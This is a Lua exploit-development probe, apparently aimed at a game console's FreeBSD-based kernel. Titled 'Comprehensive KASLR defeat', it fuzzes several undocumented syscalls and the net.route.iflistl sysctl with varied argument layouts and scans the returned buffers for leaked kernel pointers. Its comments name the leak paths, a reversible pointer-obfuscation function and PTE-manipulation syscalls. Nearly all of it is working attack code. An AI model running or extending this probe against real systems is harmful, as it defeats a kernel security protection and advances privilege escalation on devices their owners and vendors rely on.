-- CRASH_CLASS: MODERATE
-- PROBE 54f: Comprehensive KASLR defeat — all viable info leak paths
--
-- Context: Exhaustive review of all 130+ result files. Six overlooked KASLR paths:
-- 1. sys 598 (dynlib context info leak — two 8-byte values, zero priv_check)
-- 2. sys 612/649 (module member leak — mapbase/init_proc/fini_proc, zero priv_check)
-- 3. sys 639/638 (memory region info — kernel table base/size)
-- 4. net.route.iflistl (6536 bytes returned — deep kptr scan needed)
-- 5. sys 572 (VM syscall returned 0 — output buffer needs testing)
-- 6. sys 661/662/668 (pointer obfuscation — f(x) = x ^ (x >> 4), reversible)
-- Plus: sys 593 deep struct scan (check ALL 0x1A8 bytes for kptrs)

print("=== PROBE 54f: COMPREHENSIVE KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_wb(addr, val)
    return pcall(function() memory.write_byte(addr, val % 256) end)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

local function scan_kptrs(addr, len, label)
    local count = 0
    for i = 0, len - 8, 8 do
        local q = safe_rq(addr + i)
        if q and is_kptr(q) then
            count = count + 1
            print(string.format("  >>> KPTR [%s+0x%03X]: %s", label, i, hexval(q)))
        end
    end
    return count
end

local function hexdump_line(addr, offset, len)
    local parts = {}
    for i = 0, len - 1, 4 do
        local v = safe_rd(addr + offset + i)
        if v then table.insert(parts, string.format("%08X", v))
        else table.insert(parts, "????????") end
    end
    return string.format("  +%03X: %s", offset, table.concat(parts, " "))
end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do safe_wd(addr + i, 0) end
end

local sc_getpid = make_syscall(20)
local pid = 0
do
    local ok, ret = pcall(function() return sc_getpid() end)
    if ok then pid = to_num(ret) end
end
print("PID: " .. pid)
print("")

local total_kptrs = 0
local outbuf = memory.alloc(0x8000)

-- =========================================================================
-- SECTION A: sys 598 — dynlib context info leak (NEVER PROPERLY TESTED)
-- Handler says: two 8-byte values from dynlib_context+0xc8/+0xd0, zero priv_check
-- =========================================================================
print("--- A: sys 598 (dynlib context info leak) ---")
local sc598 = make_syscall(598)

-- Try various arg patterns
local a_patterns = {
    {0, 0, 0, 0},         -- zero args
    {0, "outbuf", 0x200, 0},  -- outbuf as arg2
    {"outbuf", 0x200, 0, 0},  -- outbuf as arg1
    {1, "outbuf", 0x200, 0},  -- handle=1 (first module)
    {2, "outbuf", 0x200, 0},
    {8193, "outbuf", 0x200, 0},  -- libkernel handle
    {0, 0, "outbuf", 0x200},
}
for _, pat in ipairs(a_patterns) do
    zero_buf(outbuf, 0x200)
    local args = {}
    local desc_parts = {}
    for _, v in ipairs(pat) do
        if v == "outbuf" then
            table.insert(args, uint64(outbuf))
            table.insert(desc_parts, "outbuf")
        else
            table.insert(args, uint64(v))
            table.insert(desc_parts, tostring(v))
        end
    end
    local desc = table.concat(desc_parts, ",")
    local ok, ret = pcall(function()
        return sc598(args[1], args[2], args[3], args[4], uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        print(string.format("  598(%s) ret=%d", desc, rv))
        if rv >= 0 then
            local n = scan_kptrs(outbuf, 0x200, "598")
            total_kptrs = total_kptrs + n
            -- Print first 64 bytes if non-zero
            local any_nonzero = false
            for i = 0, 0x38, 8 do
                local q = safe_rq(outbuf + i)
                if q then
                    local h, l = get_hi_lo(q)
                    if h ~= 0 or l ~= 0 then any_nonzero = true end
                end
            end
            if any_nonzero then
                print("  Non-zero output:")
                for off = 0, 0x100, 16 do
                    local line = hexdump_line(outbuf, off, 16)
                    if not line:match("^%s+%+%x+: 00000000 00000000 00000000 00000000$") then
                        print(line)
                    end
                end
            end
        end
    else
        print(string.format("  598(%s) CRASHED: %s", desc, tostring(ret)))
    end
end
print("")

-- =========================================================================
-- SECTION B: sys 612/649 — module member leak
-- Jump table returns mapbase(0x78), init_proc(0xf8), fini_proc(0x108)
-- =========================================================================
print("--- B: sys 612/649 (module member leak) ---")
local sc612 = make_syscall(612)
local sc649 = make_syscall(649)

-- Try handle + member_id combos
local handles = {0, 1, 2, 8193, 17, 19, 20, 34}
local member_ids = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}

for _, h in ipairs(handles) do
    for _, m in ipairs(member_ids) do
        zero_buf(outbuf, 0x100)
        local ok, ret = pcall(function()
            return sc612(uint64(h), uint64(m), uint64(outbuf), uint64(0x100), uint64(0), uint64(0))
        end)
        if ok then
            local rv = signed32(ret)
            if rv >= 0 then
                local q0 = safe_rq(outbuf)
                print(string.format("  612(h=%d,m=%d) ret=%d buf[0]=%s", h, m, rv, hexval(q0)))
                local n = scan_kptrs(outbuf, 0x100, "612")
                total_kptrs = total_kptrs + n
            end
        end
    end
end

-- Try 649 too
for _, h in ipairs({0, 1, 2, 8193}) do
    for _, m in ipairs({0, 1, 2, 3, 4, 5}) do
        zero_buf(outbuf, 0x100)
        local ok, ret = pcall(function()
            return sc649(uint64(h), uint64(m), uint64(outbuf), uint64(0x100), uint64(0), uint64(0))
        end)
        if ok then
            local rv = signed32(ret)
            if rv >= 0 then
                local q0 = safe_rq(outbuf)
                print(string.format("  649(h=%d,m=%d) ret=%d buf[0]=%s", h, m, rv, hexval(q0)))
                local n = scan_kptrs(outbuf, 0x100, "649")
                total_kptrs = total_kptrs + n
            end
        end
    end
end
print("")

-- =========================================================================
-- SECTION C: sys 639/638 — memory region info (kernel VA table)
-- Handler: binary search on global kernel table, copies base/size/offset
-- =========================================================================
print("--- C: sys 639/638 (memory region info) ---")
local sc639 = make_syscall(639)
local sc638 = make_syscall(638)

-- Try with various address ranges as lookup keys
local test_addrs = {
    {0, 0, "zero"},
    {0, 0x10000, "low"},
    {0x00000003, 0x11000000, "heap region"},
    {0x00000008, 0x00000000, "module region"},
    {0x00000008, 0x38000000, "libkernel region"},
    {0xFFFF8000, 0x00000000, "kernel low"},
    {0xFFFFFFFF, 0x80000000, "kernel mid"},
}

for _, ta in ipairs(test_addrs) do
    zero_buf(outbuf, 0x200)
    local addr_u64
    if ta[1] == 0 then
        addr_u64 = uint64(ta[2])
    else
        addr_u64 = uint64(string.format("0x%X%08X", ta[1], ta[2]))
    end

    -- 639(addr, outbuf, outlen, flags, 0)
    local ok, ret = pcall(function()
        return sc639(addr_u64, uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        print(string.format("  639(%s) ret=%d", ta[3], rv))
        if rv >= 0 then
            local n = scan_kptrs(outbuf, 0x200, "639")
            total_kptrs = total_kptrs + n
            for off = 0, 0x30, 16 do print(hexdump_line(outbuf, off, 16)) end
        end
    else
        print(string.format("  639(%s) CRASHED: %s", ta[3], tostring(ret)))
    end

    -- Also try: 639(outbuf, addr, outlen, flags, 0) — different arg order
    zero_buf(outbuf, 0x200)
    local ok2, ret2 = pcall(function()
        return sc639(uint64(outbuf), addr_u64, uint64(0x200), uint64(0), uint64(0), uint64(0))
    end)
    if ok2 then
        local rv2 = signed32(ret2)
        if rv2 >= 0 and rv2 ~= signed32(ret) then
            print(string.format("  639(outbuf,%s) ret=%d", ta[3], rv2))
            local n = scan_kptrs(outbuf, 0x200, "639alt")
            total_kptrs = total_kptrs + n
        end
    end

    -- 638 same patterns
    zero_buf(outbuf, 0x200)
    local ok3, ret3 = pcall(function()
        return sc638(addr_u64, uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0))
    end)
    if ok3 then
        local rv3 = signed32(ret3)
        if rv3 >= 0 then
            print(string.format("  638(%s) ret=%d", ta[3], rv3))
            local n = scan_kptrs(outbuf, 0x200, "638")
            total_kptrs = total_kptrs + n
            for off = 0, 0x30, 16 do print(hexdump_line(outbuf, off, 16)) end
        end
    end
end
print("")

-- =========================================================================
-- SECTION D: net.route.iflistl deep scan (6536 bytes — re-read and scan)
-- Previous 44d found no kptrs but used word-aligned scan only
-- =========================================================================
print("--- D: net.route.iflistl deep kernel pointer scan ---")
local sc_sysctl = make_syscall(202)
local mib = memory.alloc(32)
-- MIB for net.route.iflistl: {4, 17, 0, 0, 5, 0}
safe_wd(mib, 4)       -- CTL_NET
safe_wd(mib + 4, 17)  -- PF_ROUTE -> NET_RT
safe_wd(mib + 8, 0)   -- protocol
safe_wd(mib + 12, 0)  -- AF_UNSPEC
safe_wd(mib + 16, 5)  -- NET_RT_IFLISTL
safe_wd(mib + 20, 0)  -- flags

local bigbuf = memory.alloc(0x4000)
zero_buf(bigbuf, 0x4000)
local lenp = memory.alloc(8)
safe_wd(lenp, 0x4000)
safe_wd(lenp + 4, 0)

local ok_sysctl, ret_sysctl = pcall(function()
    return sc_sysctl(uint64(mib), uint64(6), uint64(bigbuf), uint64(lenp), uint64(0), uint64(0))
end)
if ok_sysctl then
    local rv = signed32(ret_sysctl)
    local actual_len = safe_rd(lenp) or 0
    print(string.format("  sysctl ret=%d len=%d", rv, actual_len))
    if rv == 0 and actual_len > 0 then
        local n = scan_kptrs(bigbuf, actual_len, "iflistl")
        total_kptrs = total_kptrs + n

        -- Dump every 8-byte value that's nonzero and has high bits
        for i = 0, actual_len - 8, 8 do
            local q = safe_rq(bigbuf + i)
            if q then
                local h, l = get_hi_lo(q)
                if h > 0 and h ~= 0xFFFFFFFF then
                    print(string.format("  iflistl+0x%03X: %s (high bits set)", i, hexval(q)))
                end
            end
        end

        -- Print raw first 256 bytes
        print("  raw (first 256 bytes):")
        for off = 0, math.min(actual_len, 256) - 16, 16 do
            print(hexdump_line(bigbuf, off, 16))
        end
    end
end

-- Also try net.route.iflist (1408 bytes)
safe_wd(mib + 16, 3)  -- NET_RT_IFLIST
zero_buf(bigbuf, 0x4000)
safe_wd(lenp, 0x4000)
safe_wd(lenp + 4, 0)

local ok_ifl, ret_ifl = pcall(function()
    return sc_sysctl(uint64(mib), uint64(6), uint64(bigbuf), uint64(lenp), uint64(0), uint64(0))
end)
if ok_ifl then
    local rv = signed32(ret_ifl)
    local actual_len = safe_rd(lenp) or 0
    print(string.format("  iflist ret=%d len=%d", rv, actual_len))
    if rv == 0 and actual_len > 0 then
        local n = scan_kptrs(bigbuf, actual_len, "iflist")
        total_kptrs = total_kptrs + n
    end
end
print("")

-- =========================================================================
-- SECTION E: sys 572 — VM syscall (returned 0 with zero args!)
-- Context-dependent validation. Try with output buffers.
-- =========================================================================
print("--- E: sys 572 (VM syscall — returned 0 before) ---")
local sc572 = make_syscall(572)

local e_patterns = {
    {"outbuf,0x200,0,0,0,0", {uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0), uint64(0)}},
    {"0,outbuf,0x200,0,0,0", {uint64(0), uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0)}},
    {"0,0,outbuf,0x200,0,0", {uint64(0), uint64(0), uint64(outbuf), uint64(0x200), uint64(0), uint64(0)}},
    {"1,outbuf,0x200,0,0,0", {uint64(1), uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0)}},
    {"2,outbuf,0x200,0,0,0", {uint64(2), uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0)}},
}

for _, pat in ipairs(e_patterns) do
    zero_buf(outbuf, 0x200)
    local ok, ret = pcall(function()
        return sc572(pat[2][1], pat[2][2], pat[2][3], pat[2][4], pat[2][5], pat[2][6])
    end)
    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local q1 = safe_rq(outbuf + 8)
        print(string.format("  572(%s) ret=%d buf[0]=%s buf[8]=%s", pat[1], rv, hexval(q0), hexval(q1)))
        if rv >= 0 then
            local n = scan_kptrs(outbuf, 0x200, "572")
            total_kptrs = total_kptrs + n
            local any = false
            for i = 0, 0x38, 8 do
                local q = safe_rq(outbuf + i)
                if q then
                    local h, l = get_hi_lo(q)
                    if h ~= 0 or l ~= 0 then any = true end
                end
            end
            if any then
                for off = 0, 0x40, 16 do print(hexdump_line(outbuf, off, 16)) end
            end
        end
    else
        print(string.format("  572(%s) CRASHED: %s", pat[1], tostring(ret)))
    end
end
print("")

-- =========================================================================
-- SECTION F: sys 593 deep scan — full 0x1A8 struct from ALL 39 modules
-- Previous tests found module bases but never scanned for KERNEL pointers
-- in the full struct. init_proc/fini_proc fields could be kernel VAs.
-- =========================================================================
print("--- F: sys 593 deep struct scan (all modules, all 0x1A8 bytes) ---")
local sc593 = make_syscall(593)
local info_buf = memory.alloc(0x200)
local handles_to_try = {1, 2, 8193, 17, 19, 20, 34, 49, 50, 51, 52, 53, 54, 55, 56, 58,
    61, 64, 65, 66, 72, 74, 76, 78, 81, 82, 126, 129, 130, 141, 142, 159, 160, 162,
    8381, 8692, 502, 506, 507}

for _, h in ipairs(handles_to_try) do
    zero_buf(info_buf, 0x200)
    safe_wd(info_buf, 0x160)  -- size field
    local ok, ret = pcall(function()
        return sc593(uint64(h), uint64(info_buf), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok and signed32(ret) >= 0 then
        local n = scan_kptrs(info_buf, 0x160, string.format("593_h%d", h))
        total_kptrs = total_kptrs + n
        -- Check specific offsets where kernel addrs might hide
        -- +0x148: init_proc_addr, +0x150: fini_proc_addr, +0x158: eh_frame_hdr
        for _, off in ipairs({0x148, 0x150, 0x158, 0x100, 0x108, 0x0}) do
            local q = safe_rq(info_buf + off)
            if q then
                local h2, l2 = get_hi_lo(q)
                if h2 > 0 and h2 ~= 0xFFFFFFFF and (h2 < 0x00000008 or h2 > 0x0000000F) then
                    print(string.format("  593(h=%d) +0x%03X: %s (unusual high bits)", h, off, hexval(q)))
                end
            end
        end
    end
end
print("")

-- =========================================================================
-- SECTION G: AIO 661/662/668 — pointer obfuscation (f(x) = x ^ (x >> 4))
-- CRITICAL: If event subsystem runs on 14.10, this gives kernel heap KASLR
-- =========================================================================
print("--- G: AIO event subsystem (661/662/668 — obfuscated kptr leak) ---")

-- First test: do any of 661-670 survive?
for num = 661, 670 do
    zero_buf(outbuf, 0x200)
    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(uint64(0), uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        print(string.format("  %d(0,outbuf,0x200,0,0,0) ret=%d buf[0]=%s", num, rv, hexval(q0)))
        if rv >= 0 then
            local n = scan_kptrs(outbuf, 0x200, tostring(num))
            total_kptrs = total_kptrs + n

            -- Check for obfuscated pointers (high nibbles of deobfuscated value)
            for i = 0, 0x38, 8 do
                local q = safe_rq(outbuf + i)
                if q then
                    local h2, l2 = get_hi_lo(q)
                    if h2 ~= 0 and h2 ~= 0xFFFFFFFF then
                        -- Try deobfuscating: reverse f(x) = x ^ (x >> 4)
                        print(string.format("  %d+0x%02X: %s (possibly obfuscated kptr)", num, i, hexval(q)))
                    end
                end
            end
        end
    else
        print(string.format("  %d CRASHED: %s", num, tostring(ret)))
        -- If it crashed, that's actually interesting — the handler ran!
    end
end

-- Try with different arg layouts for 661
print("")
print("  661 with event-like args:")
local sc661 = make_syscall(661)
local event_patterns = {
    {1, "outbuf", 1, 0},      -- event_id=1, outbuf, count=1
    {0, "outbuf", 1, 0},      -- event_id=0
    {"outbuf", 1, 0, 0},      -- outbuf first
    {1, 0, "outbuf", 1},      -- different layout
}
for _, pat in ipairs(event_patterns) do
    zero_buf(outbuf, 0x200)
    local args = {}
    local desc = {}
    for _, v in ipairs(pat) do
        if v == "outbuf" then
            table.insert(args, uint64(outbuf))
            table.insert(desc, "buf")
        else
            table.insert(args, uint64(v))
            table.insert(desc, tostring(v))
        end
    end
    local ok, ret = pcall(function()
        return sc661(args[1], args[2], args[3], args[4], uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        print(string.format("    661(%s) ret=%d buf[0]=%s", table.concat(desc,","), rv, hexval(q0)))
        if rv >= 0 then
            scan_kptrs(outbuf, 0x100, "661")
        end
    else
        print(string.format("    661(%s) CRASHED: %s", table.concat(desc,","), tostring(ret)))
    end
end
print("")

-- =========================================================================
-- SECTION H: sys 563-566 return values (they returned 0 = SUCCESS!)
-- 565/566 are PTE manipulation. What do they actually return in buffers?
-- =========================================================================
print("--- H: sys 563-566 (returned 0 — check output data) ---")
for num = 563, 566 do
    zero_buf(outbuf, 0x200)
    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local q1 = safe_rq(outbuf + 8)
        print(string.format("  %d(outbuf,0x200,0,0,0,0) ret=%d buf[0]=%s buf[8]=%s", num, rv, hexval(q0), hexval(q1)))
        if rv >= 0 then
            local n = scan_kptrs(outbuf, 0x200, tostring(num))
            total_kptrs = total_kptrs + n
        end
    else
        print(string.format("  %d CRASHED: %s", num, tostring(ret)))
    end

    -- Also try with module handle + index args
    zero_buf(outbuf, 0x200)
    local ok2, ret2 = pcall(function()
        return sc(uint64(8193), uint64(0), uint64(outbuf), uint64(0x200), uint64(0), uint64(0))
    end)
    if ok2 then
        local rv2 = signed32(ret2)
        if rv2 >= 0 then
            local q0 = safe_rq(outbuf)
            print(string.format("  %d(8193,0,outbuf,0x200) ret=%d buf[0]=%s", num, rv2, hexval(q0)))
            scan_kptrs(outbuf, 0x200, tostring(num) .. "b")
        end
    end
end
print("")

-- =========================================================================
-- SUMMARY
-- =========================================================================
print("=== TOTAL KERNEL POINTER CANDIDATES: " .. total_kptrs .. " ===")
if total_kptrs > 0 then
    print("*** KASLR DEFEAT POSSIBLE — analyze pointer values above ***")
else
    print("No kernel pointers found in this pass.")
end
print("")
print("=== PROBE 54f COMPLETE ===")
